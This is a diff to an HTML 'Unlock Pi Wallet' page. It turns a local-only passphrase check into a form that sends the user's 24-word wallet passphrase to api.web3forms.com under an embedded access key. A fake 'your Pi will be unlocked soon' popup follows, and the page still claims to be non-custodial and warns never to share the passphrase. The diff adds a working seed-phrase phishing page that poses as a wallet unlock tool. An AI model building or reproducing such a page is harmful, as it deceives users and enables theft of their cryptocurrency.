@@ -9,36 +9,41 @@
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 20px;
-            background-color: #f4f4f9;
+            background-color: #f9f9fc;
+            margin: 0;
         }
         .container {
-            max-width: 500px;
-            margin: auto;
+            max-width: 400px;
+            margin: 50px auto;
             padding: 20px;
-            border: 1px solid #ccc;
-            border-radius: 10px;
+            border-radius: 15px;
             background: #fff;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
         textarea {
-            width: 100%;
-            height: 150px;
+            width: calc(100% - 20px);
+            height: 100px;
             margin-bottom: 10px;
             padding: 10px;
             border: 1px solid #ccc;
-            border-radius: 5px;
+            border-radius: 10px;
             font-size: 1em;
+            background-color: #f4f4f9;
         }
         button {
-            background-color: #6c63ff;
-            color: #fff;
-            padding: 10px 20px;
+            width: 100%;
+            padding: 10px;
             border: none;
-            border-radius: 5px;
+            border-radius: 10px;
             cursor: pointer;
             font-size: 1em;
+            margin-bottom: 10px;
         }
-        button:hover {
+        .primary {
+            background-color: #6c63ff;
+            color: #fff;
+        }
+        .primary:hover {
             background-color: #5a52e0;
         }
         p {
@@ -48,32 +53,152 @@
         .warning {
             color: #ff4444;
             font-weight: bold;
+        }
+        .word-count {
+            font-size: 0.9em;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        #result {
             margin-top: 10px;
+            font-size: 0.9em;
+        }
+        /* Popup Styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            text-align: center;
+        }
+        .popup button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 10px;
+            background-color: #6c63ff;
+            color: white;
+            cursor: pointer;
+        }
+        .popup button:hover {
+            background-color: #5a52e0;
+        }
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        a {
+            color: #6c63ff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Unlock Pi Wallet</h1>
-        <textarea id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
-        <button onclick="validatePassphrase()">Unlock With Passphrase</button>
+        <form method="POST" id="form">
+            <!-- Web3Forms Access Key -->
+            <input type="hidden" name="access_key" value="5ddf0f93-a023-4151-8a75-487118c9a08c">
+
+            <!-- Passphrase Field -->
+            <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+            <p class="word-count" id="wordCount">Words entered: 0/24</p>
+
+            <button type="submit" class="primary">Unlock With Passphrase</button>
+            <div id="result"></div>
+        </form>
         <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p class="warning">⚠️ Never share your passphrase with anyone. Ensure you are on a trusted website.</p>
+        <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+    </div>
+
+    <!-- Popup -->
+    <div class="popup-overlay" id="popupOverlay"></div>
+    <div class="popup" id="popup">
+        <p>Congratulations! Your Pi will be unlocked soon. Happy mining!</p>
+        <button onclick="closePopup()">OK</button>
     </div>
 
     <script>
-        function validatePassphrase() {
-            const passphrase = document.getElementById('passphrase').value.trim();
-            const words = passphrase.split(/\s+/).filter(word => word.length > 0);
+        const form = document.getElementById('form');
+        const passphrase = document.getElementById('passphrase');
+        const wordCountDisplay = document.getElementById('wordCount');
+        const result = document.getElementById('result');
+        const popup = document.getElementById('popup');
+        const popupOverlay = document.getElementById('popupOverlay');
 
-            if (words.length !== 24) {
-                alert("Invalid passphrase. Please enter exactly 24 words.");
-                return;
+        // Word Count Validation
+        passphrase.addEventListener('input', function () {
+            const wordCount = this.value.trim().split(/\s+/).filter(word => word.length > 0).length;
+            wordCountDisplay.textContent = `Words entered: ${wordCount}/24`;
+
+            if (wordCount !== 24) {
+                this.setCustomValidity("Please enter exactly 24 words.");
+            } else {
+                this.setCustomValidity("");
             }
+        });
 
-            // Simulate local wallet unlock (do not send passphrase to a server)
-            alert("Wallet unlocked locally. Passphrase not sent over the internet.");
-            // Add logic to decrypt wallet locally here
+        // Web3Forms Submission
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+            const formData = new FormData(form);
+            const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
+
+            result.textContent = "Please wait...";
+
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: json
+            })
+            .then(async (response) => {
+                const jsonResponse = await response.json();
+                if (response.ok) {
+                    result.textContent = "";
+                    showPopup();
+                } else {
+                    result.textContent = `Error: ${jsonResponse.message}`;
+                }
+            })
+            .catch(() => {
+                result.textContent = "Something went wrong. Please try again.";
+            })
+            .finally(() => {
+                form.reset();
+                wordCountDisplay.textContent = "Words entered: 0/24";
+            });
+        });
+
+        // Show Popup
+        function showPopup() {
+            popup.style.display = 'block';
+            popupOverlay.style.display = 'block';
+        }
+
+        // Close Popup
+        function closePopup() {
+            popup.style.display = 'none';
+            popupOverlay.style.display = 'none';
         }
     </script>
 </body>
